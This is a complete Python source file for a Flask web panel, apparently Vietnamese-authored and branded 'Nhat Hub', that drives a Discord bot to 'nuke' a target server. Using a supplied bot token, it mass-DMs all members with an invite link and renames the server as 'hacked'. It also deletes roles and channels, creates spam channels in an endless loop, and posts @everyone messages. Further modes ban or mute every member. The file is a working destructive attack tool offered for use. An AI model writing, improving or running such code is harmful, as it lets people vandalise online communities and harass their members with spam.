# app.py
# Web tool deploy lên host free - nhập token trực tiếp trên web
# Chạy: python app.py

import subprocess
import sys
import os

# ================= TỰ ĐỘNG CÀI THƯ VIỆN THIẾU =================
def cai_thu_vien(thu_vien, ten_pip=None):
    ten_pip = ten_pip or thu_vien
    print(f"[NSMOD] Kiểm tra thư viện: {thu_vien}")
    try:
        __import__(thu_vien)
        print(f"[NSMOD] Đã có: {thu_vien}")
    except ImportError:
        print(f"[NSMOD] Thiếu: {thu_vien} - cài đặt")
        subprocess.check_call([sys.executable, "-m", "pip", "install", ten_pip])
        print(f"[NSMOD] Cài xong: {thu_vien}")

cai_thu_vien("flask")
cai_thu_vien("discord")
cai_thu_vien("aiohttp")

# ================= IMPORT =================
from flask import Flask, render_template_string, request, jsonify
import discord
import asyncio
import threading
import json
import os
import random
import time
import logging

# ================= CẤU HÌNH =================
HOST = "0.0.0.0"
PORT = int(os.environ.get("PORT", 5000))
CONFIG_FILE = "web_config.json"

log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

app = Flask(__name__)

# ================= QUẢN LÝ CẤU HÌNH =================
def doc_config():
    mac_dinh = {
        "token": "",
        "link_server": "https://discord.gg/your-invite",
        "noi_dung_dm": "# 🤡 𝕯 Ã  𝕭 Ị  𝕿 𝕽 Ò 𝕷 𝕷  𝕽 Ồ 𝕴  𝕶 𝕶 🤪\n## ⚡ ꧁༺𝓝𝓗𝓐𝓣 𝓗𝓤𝓑༻꧂ ⚡\n### 👑 BẤM NÚT BÊN DƯỚI ĐỂ JOIN SERVER 👑",
        "guild_id": "",
        "che_do": "nuke",
        "so_kenh_moi_batch": 20,
        "delay": 0.001,
        "gui_dm_join": True,
        "xoa_role": True,
        "xoa_kenh": True,
        "spam_tin_nhan": True
    }
    if not os.path.exists(CONFIG_FILE):
        return mac_dinh
    try:
        with open(CONFIG_FILE, "r", encoding="utf-8") as f:
            data = json.load(f)
            for k, v in mac_dinh.items():
                if k not in data:
                    data[k] = v
            return data
    except Exception:
        return mac_dinh

def ghi_config(data):
    with open(CONFIG_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, ensure_ascii=False, indent=2)

# ================= TRẠNG THÁI =================
class TrangThai:
    def __init__(self):
        self.dang_chay = False
        self.client = None
        self.log = []
        self.thread = None
        self.dung_flag = False

    def them_log(self, text):
        t = time.strftime("%H:%M:%S")
        dong = f"[{t}] {text}"
        self.log.append(dong)
        if len(self.log) > 500:
            self.log = self.log[-500:]
        print(dong)

tt = TrangThai()

# ================= VIEW NÚT JOIN =================
class NutJoin(discord.ui.View):
    def __init__(self, link):
        super().__init__(timeout=None)
        if link:
            self.add_item(discord.ui.Button(
                label="JOIN SERVER NGAY",
                style=discord.ButtonStyle.link,
                url=link,
                emoji="👑"
            ))

# ================= CLASS BOT =================
class BotTool(discord.Client):
    def __init__(self, config, *args, **kwargs):
        intents = discord.Intents.default()
        intents.guilds = True
        intents.members = True
        intents.voice_states = True
        intents.message_content = True
        super().__init__(intents=intents, *args, **kwargs)
        self.config = config

    async def on_ready(self):
        tt.them_log(f"[✓] Bot online: {self.user}")
        tt.them_log(f"[✓] Số server: {len(self.guilds)}")
        guild_id = self.config.get("guild_id", "").strip()
        if guild_id:
            try:
                gid = int(guild_id)
                guild = self.get_guild(gid)
                if guild:
                    tt.them_log(f"[✓] Server mục tiêu: {guild.name}")
                    await self.thuc_thi(guild)
                else:
                    tt.them_log(f"[✗] Không tìm thấy server ID {gid}")
            except ValueError:
                tt.them_log(f"[✗] Guild ID không hợp lệ")
        else:
            tt.them_log(f"[!] Chưa nhập Guild ID")
        await self.close()
        tt.dang_chay = False
        tt.them_log("[✓] Đã đóng bot.")

    async def thuc_thi(self, guild):
        che_do = self.config.get("che_do", "nuke")
        if che_do == "nuke":
            await self.nuke(guild)
        elif che_do == "ban_all":
            await self.ban_all(guild)
        elif che_do == "mute_all":
            await self.mute_all(guild)

    async def gui_dm(self, member, noi_dung, view):
        try:
            await member.send(noi_dung, view=view)
            return True
        except Exception:
            return False

    async def nuke(self, guild):
        config = self.config
        tt.them_log(f"[!] BẮT ĐẦU NUKE: {guild.name}")

        if config.get("gui_dm_join", True):
            tt.them_log("[1/4] Gửi DM kèm nút Join...")
            link = config.get("link_server", "")
            noi_dung = config.get("noi_dung_dm", "")
            view = NutJoin(link)
            members = [m for m in guild.members if m != guild.me and not m.bot]
            dem = 0
            for i in range(0, len(members), 50):
                if tt.dung_flag:
                    break
                batch = members[i:i+50]
                tasks = [self.gui_dm(m, noi_dung, view) for m in batch]
                await asyncio.gather(*tasks, return_exceptions=True)
                dem += len(batch)
                tt.them_log(f"[✓] DM: {dem}/{len(members)}")
                await asyncio.sleep(0.1)

        tt.them_log("[2/4] Đổi tên server...")
        try:
            await guild.edit(name="𝕿 𝕽 Ò   𝕮 Ơ Ỉ   𝕯 Ạ 𝕾   𝕭 Ạ 𝕩   ---   𝓝𝓗𝓐𝓣 𝓗𝓤𝓑   👑 🔥 ⚡")
        except Exception:
            pass

        tt.them_log("[3/4] Xóa role và kênh...")
        if config.get("xoa_role", True):
            role_tasks = []
            for role in guild.roles:
                if role != guild.default_role and not role.managed and guild.me.top_role > role:
                    role_tasks.append(role.edit(permissions=discord.Permissions.none(), name="hacked-by-nhathub"))
            if role_tasks:
                await asyncio.gather(*role_tasks, return_exceptions=True)
            delete_role_tasks = [role.delete() for role in guild.roles if role != guild.default_role and not role.managed and guild.me.top_role > role]
            if delete_role_tasks:
                await asyncio.gather(*delete_role_tasks, return_exceptions=True)
            tt.them_log("[✓] Xóa role xong.")

        if config.get("xoa_kenh", True):
            delete_tasks = [ch.delete() for ch in guild.channels]
            await asyncio.gather(*delete_tasks, return_exceptions=True)
            tt.them_log("[✓] Xóa kênh xong.")

        if config.get("spam_tin_nhan", True):
            tt.them_log("[4/4] Spam kênh và tin nhắn...")
            link = config.get("link_server", "")
            troll_msg = (
                "@everyone\n"
                "# 🤡 𝕯 Ã  𝕭 Ị  𝕿 𝕽 Ò 𝕷 𝕷  𝕽 Ồ 𝕴  𝕶 𝕶 🤪\n"
                "## ⚡ ꧁༺𝓝𝓗𝓐𝓣 𝓗𝓤𝓑༻꧂ ⚡\n"
                f"### 👑 JOIN SERVER: {link}"
            )
            random_words = ["𒅌𒅌𒅌𒅌𒅌𒅌𒅌", "🕋ﷲ﷽🕋ﷲ﷽", "hacked-by-nhathub", "troll-server-vip"]
            batch_size = config.get("so_kenh_moi_batch", 20)
            delay = config.get("delay", 0.001)
            dem_kenh = 0
            while not tt.dung_flag:
                batch_tasks = []
                for _ in range(batch_size):
                    name_part1 = "-".join(random.choices(random_words, k=3))
                    name_part2 = "".join(random.choices("abcdefghijklmnopqrstuvwxyz", k=8))
                    channel_name = f"🔥-{name_part1}-{name_part2}-💀"
                    batch_tasks.append(guild.create_text_channel(channel_name))
                try:
                    await asyncio.gather(*batch_tasks, return_exceptions=True)
                except Exception:
                    pass
                dem_kenh += batch_size
                all_text_channels = list(guild.text_channels)
                if all_text_channels:
                    spam_tasks = [ch.send(troll_msg) for ch in all_text_channels[:50]]
                    await asyncio.gather(*spam_tasks, return_exceptions=True)
                if dem_kenh % 100 == 0:
                    tt.them_log(f"[✓] Đã tạo {dem_kenh} kênh")
                await asyncio.sleep(delay)

        tt.them_log("[✓] NUKE hoàn tất!")

    async def ban_all(self, guild):
        tt.them_log(f"[!] BAN ALL: {guild.name}")
        members = [m for m in guild.members if m != guild.me and m != guild.owner and guild.me.top_role > m.top_role]
        dem = 0
        for i in range(0, len(members), 50):
            if tt.dung_flag:
                break
            batch = members[i:i+50]
            tasks = [guild.ban(m, reason="Ban All By Nhat Hub") for m in batch]
            await asyncio.gather(*tasks, return_exceptions=True)
            dem += len(batch)
            tt.them_log(f"[✓] Ban: {dem}/{len(members)}")
        tt.them_log("[✓] BAN ALL xong!")

    async def mute_all(self, guild):
        tt.them_log(f"[!] MUTE ALL: {guild.name}")
        tasks = []
        for channel in guild.voice_channels:
            for member in channel.members:
                if member != guild.me:
                    tasks.append(member.edit(mute=True, reason="Mute All By Nhat Hub"))
        if tasks:
            await asyncio.gather(*tasks, return_exceptions=True)
        tt.them_log("[✓] MUTE ALL xong!")

# ================= CHẠY BOT TRONG THREAD =================
def chay_bot_thread(config):
    def run():
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        bot = BotTool(config)
        tt.client = bot
        try:
            loop.run_until_complete(bot.start(config["token"]))
        except Exception as e:
            tt.them_log(f"[✗] Lỗi bot: {e}")
        finally:
            tt.dang_chay = False

    tt.dung_flag = False
    tt.thread = threading.Thread(target=run, daemon=True)
    tt.thread.start()

# ================= HTML =================
HTML = """<!DOCTYPE html>
<html lang="vi">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>NHAT HUB WEB TOOL</title>
<style>
* { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Consolas', 'Courier New', monospace; }
body { background: #0a0a0f; color: #e0e0e0; min-height: 100vh; padding: 20px; }
.header { text-align: center; padding: 20px; border: 2px solid #ffcc00; border-radius: 10px; margin-bottom: 20px; background: linear-gradient(135deg, #1a0a0a, #0a0a1a); }
.header h1 { color: #ffcc00; font-size: 26px; letter-spacing: 3px; text-shadow: 0 0 15px #ffcc00; }
.header p { color: #888; margin-top: 8px; font-size: 13px; }
.container { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; max-width: 1400px; margin: 0 auto; }
@media (max-width: 900px) { .container { grid-template-columns: 1fr; } }
.card { background: #12121a; border: 1px solid #333; border-radius: 10px; padding: 20px; }
.card h2 { color: #ffcc00; font-size: 16px; margin-bottom: 15px; border-bottom: 1px solid #333; padding-bottom: 8px; letter-spacing: 1px; }
label { display: block; color: #aaa; font-size: 13px; margin-top: 12px; margin-bottom: 5px; }
input, textarea, select { width: 100%; padding: 10px; background: #0a0a0f; border: 1px solid #444; border-radius: 5px; color: #ffcc00; font-family: inherit; font-size: 13px; outline: none; }
input:focus, textarea:focus, select:focus { border-color: #ffcc00; box-shadow: 0 0 8px #ffcc0055; }
textarea { resize: vertical; min-height: 90px; }
.checkbox-row { display: flex; align-items: center; gap: 10px; margin-top: 10px; }
.checkbox-row input[type="checkbox"] { width: 18px; height: 18px; accent-color: #ffcc00; }
.checkbox-row label { margin: 0; color: #e0e0e0; cursor: pointer; }
button { padding: 12px 20px; background: #ffcc00; color: #0a0a0f; border: none; border-radius: 5px; font-weight: bold; font-size: 14px; cursor: pointer; font-family: inherit; letter-spacing: 1px; transition: all 0.2s; margin-top: 10px; }
button:hover { background: #ffdd44; box-shadow: 0 0 20px #ffcc0088; }
button.danger { background: #ff3b3b; color: #fff; }
button.danger:hover { background: #ff5555; }
button.secondary { background: #444; color: #fff; }
button.secondary:hover { background: #666; }
button:disabled { opacity: 0.5; cursor: not-allowed; }
.log-box { background: #000; border: 1px solid #333; border-radius: 5px; padding: 12px; height: 500px; overflow-y: auto; font-size: 12px; line-height: 1.6; color: #0f0; }
.log-box .line { white-space: pre-wrap; word-break: break-all; }
.log-box .err { color: #ff5555; }
.log-box .ok { color: #00ff88; }
.log-box .info { color: #00aaff; }
.status { display: inline-block; padding: 4px 12px; border-radius: 20px; font-size: 12px; font-weight: bold; margin-left: 10px; }
.status.online { background: #00ff8833; color: #00ff88; border: 1px solid #00ff88; }
.status.offline { background: #ff3b3b33; color: #ff3b3b; border: 1px solid #ff3b3b; }
.row-btns { display: flex; gap: 10px; flex-wrap: wrap; }
.footer { text-align: center; color: #555; margin-top: 20px; font-size: 12px; }
</style>
</head>
<body>
<div class="header">
    <h1>⚡ NHAT HUB WEB TOOL ⚡</h1>
    <p>Nhập token trực tiếp trên web - Made by The Nhật Hub</p>
</div>

<div class="container">
    <div class="card">
        <h2>⚙️ CẤU HÌNH</h2>

        <label>Token Bot Discord</label>
        <input type="password" id="token" placeholder="MTxxxxxxxxxxxxxxxxxxxxxxxx" value="{{ config.token }}">

        <label>Guild ID (Server mục tiêu)</label>
        <input type="text" id="guild_id" placeholder="123456789012345678" value="{{ config.guild_id }}">

        <label>Link Server (dùng cho nút Join)</label>
        <input type="text" id="link_server" placeholder="https://discord.gg/..." value="{{ config.link_server }}">

        <label>Nội dung DM</label>
        <textarea id="noi_dung_dm">{{ config.noi_dung_dm }}</textarea>

        <label>Chế độ thực thi</label>
        <select id="che_do">
            <option value="nuke" {% if config.che_do == 'nuke' %}selected{% endif %}>💥 Nuke + DM Join</option>
            <option value="ban_all" {% if config.che_do == 'ban_all' %}selected{% endif %}>⚔️ Ban All</option>
            <option value="mute_all" {% if config.che_do == 'mute_all' %}selected{% endif %}>🔇 Mute All</option>
        </select>

        <div class="checkbox-row">
            <input type="checkbox" id="gui_dm_join" {% if config.gui_dm_join %}checked{% endif %}>
            <label for="gui_dm_join">Gửi DM kèm nút Join</label>
        </div>
        <div class="checkbox-row">
            <input type="checkbox" id="xoa_role" {% if config.xoa_role %}checked{% endif %}>
            <label for="xoa_role">Xóa role</label>
        </div>
        <div class="checkbox-row">
            <input type="checkbox" id="xoa_kenh" {% if config.xoa_kenh %}checked{% endif %}>
            <label for="xoa_kenh">Xóa kênh</label>
        </div>
        <div class="checkbox-row">
            <input type="checkbox" id="spam_tin_nhan" {% if config.spam_tin_nhan %}checked{% endif %}>
            <label for="spam_tin_nhan">Spam tin nhắn</label>
        </div>

        <label>Số kênh mỗi batch</label>
        <input type="number" id="so_kenh_moi_batch" value="{{ config.so_kenh_moi_batch }}" min="1" max="100">

        <label>Delay (giây)</label>
        <input type="number" id="delay" value="{{ config.delay }}" step="0.001" min="0">

        <div class="row-btns">
            <button onclick="luuConfig()">💾 LƯU CẤU HÌNH</button>
            <button class="secondary" onclick="taiConfig()">🔄 TẢI LẠI</button>
        </div>
    </div>

    <div class="card">
        <h2>🚀 ĐIỀU KHIỂN <span id="status" class="status offline">OFFLINE</span></h2>

        <div class="row-btns">
            <button id="btn-start" onclick="chayBot()">▶️ CHẠY BOT</button>
            <button id="btn-stop" class="danger" onclick="dungBot()" disabled>🛑 DỪNG BOT</button>
            <button class="secondary" onclick="xoaLog()">🗑️ XÓA LOG</button>
        </div>

        <h2 style="margin-top:20px;">📋 LOG</h2>
        <div class="log-box" id="log-box"></div>
    </div>
</div>

<div class="footer">MADE BY THE NHẬT HUB - V4.0</div>

<script>
let logInterval = null;

function layForm() {
    return {
        token: document.getElementById('token').value.trim(),
        guild_id: document.getElementById('guild_id').value.trim(),
        link_server: document.getElementById('link_server').value.trim(),
        noi_dung_dm: document.getElementById('noi_dung_dm').value,
        che_do: document.getElementById('che_do').value,
        gui_dm_join: document.getElementById('gui_dm_join').checked,
        xoa_role: document.getElementById('xoa_role').checked,
        xoa_kenh: document.getElementById('xoa_kenh').checked,
        spam_tin_nhan: document.getElementById('spam_tin_nhan').checked,
        so_kenh_moi_batch: parseInt(document.getElementById('so_kenh_moi_batch').value) || 20,
        delay: parseFloat(document.getElementById('delay').value) || 0.001
    };
}

async function luuConfig() {
    const data = layForm();
    const res = await fetch('/api/luu', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify(data)
    });
    const kq = await res.json();
    alert(kq.msg);
}

async function taiConfig() {
    const res = await fetch('/api/config');
    const data = await res.json();
    document.getElementById('token').value = data.token || '';
    document.getElementById('guild_id').value = data.guild_id || '';
    document.getElementById('link_server').value = data.link_server || '';
    document.getElementById('noi_dung_dm').value = data.noi_dung_dm || '';
    document.getElementById('che_do').value = data.che_do || 'nuke';
    document.getElementById('gui_dm_join').checked = data.gui_dm_join;
    document.getElementById('xoa_role').checked = data.xoa_role;
    document.getElementById('xoa_kenh').checked = data.xoa_kenh;
    document.getElementById('spam_tin_nhan').checked = data.spam_tin_nhan;
    document.getElementById('so_kenh_moi_batch').value = data.so_kenh_moi_batch;
    document.getElementById('delay').value = data.delay;
}

async function chayBot() {
    const data = layForm();
    if (!data.token) { alert('Chưa nhập token!'); return; }
    if (!data.guild_id) { alert('Chưa nhập Guild ID!'); return; }
    await fetch('/api/luu', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify(data)
    });
    const res = await fetch('/api/chay', {method: 'POST'});
    const kq = await res.json();
    if (kq.ok) {
        document.getElementById('btn-start').disabled = true;
        document.getElementById('btn-stop').disabled = false;
        document.getElementById('status').className = 'status online';
        document.getElementById('status').innerText = 'ONLINE';
        batDauLog();
    } else {
        alert(kq.msg);
    }
}

async function dungBot() {
    await fetch('/api/dung', {method: 'POST'});
    document.getElementById('btn-start').disabled = false;
    document.getElementById('btn-stop').disabled = true;
    document.getElementById('status').className = 'status offline';
    document.getElementById('status').innerText = 'OFFLINE';
}

async function capNhatLog() {
    const res = await fetch('/api/log');
    const data = await res.json();
    const box = document.getElementById('log-box');
    box.innerHTML = '';
    data.log.forEach(dong => {
        const div = document.createElement('div');
        div.className = 'line';
        if (dong.includes('[✓]') || dong.includes('online')) div.className += ' ok';
        else if (dong.includes('[✗]') || dong.includes('Lỗi')) div.className += ' err';
        else if (dong.includes('[!]')) div.className += ' info';
        div.innerText = dong;
        box.appendChild(div);
    });
    box.scrollTop = box.scrollHeight;
}

function batDauLog() {
    if (logInterval) clearInterval(logInterval);
    logInterval = setInterval(capNhatLog, 1000);
    capNhatLog();
}

function xoaLog() {
    document.getElementById('log-box').innerHTML = '';
}

window.onload = async () => {
    const res = await fetch('/api/trangthai');
    const data = await res.json();
    if (data.dang_chay) {
        document.getElementById('btn-start').disabled = true;
        document.getElementById('btn-stop').disabled = false;
        document.getElementById('status').className = 'status online';
        document.getElementById('status').innerText = 'ONLINE';
    }
    batDauLog();
};
</script>
</body>
</html>
"""

# ================= ROUTES =================
@app.route("/")
def index():
    config = doc_config()
    return render_template_string(HTML, config=config)

@app.route("/api/config")
def api_config():
    return jsonify(doc_config())

@app.route("/api/luu", methods=["POST"])
def api_luu():
    try:
        data = request.get_json()
        ghi_config(data)
        return jsonify({"ok": True, "msg": "Đã lưu cấu hình!"})
    except Exception as e:
        return jsonify({"ok": False, "msg": f"Lỗi: {e}"})

@app.route("/api/chay", methods=["POST"])
def api_chay():
    if tt.dang_chay:
        return jsonify({"ok": False, "msg": "Bot đang chạy!"})
    config = doc_config()
    if not config.get("token"):
        return jsonify({"ok": False, "msg": "Chưa có token!"})
    if not config.get("guild_id"):
        return jsonify({"ok": False, "msg": "Chưa có Guild ID!"})
    tt.dang_chay = True
    tt.log = []
    tt.them_log("[!] Khởi động bot...")
    chay_bot_thread(config)
    return jsonify({"ok": True, "msg": "Đã chạy bot!"})

@app.route("/api/dung", methods=["POST"])
def api_dung():
    tt.dung_flag = True
    tt.them_log("[!] Đã gửi lệnh dừng.")
    return jsonify({"ok": True, "msg": "Đã dừng!"})

@app.route("/api/log")
def api_log():
    return jsonify({"log": tt.log})

@app.route("/api/trangthai")
def api_trangthai():
    return jsonify({"dang_chay": tt.dang_chay})

@app.route("/health")
def health():
    return "OK", 200

# ================= CHẠY =================
if __name__ == "__main__":
    print("=" * 70)
    print("  NHAT HUB WEB TOOL V4")
    print("=" * 70)
    print(f"  Web chạy tại: http://0.0.0.0:{PORT}")
    print(f"  Truy cập local: http://127.0.0.1:{PORT}")
    print("=" * 70)
    app.run(host=HOST, port=PORT, debug=False, threaded=True, use_reloader=False)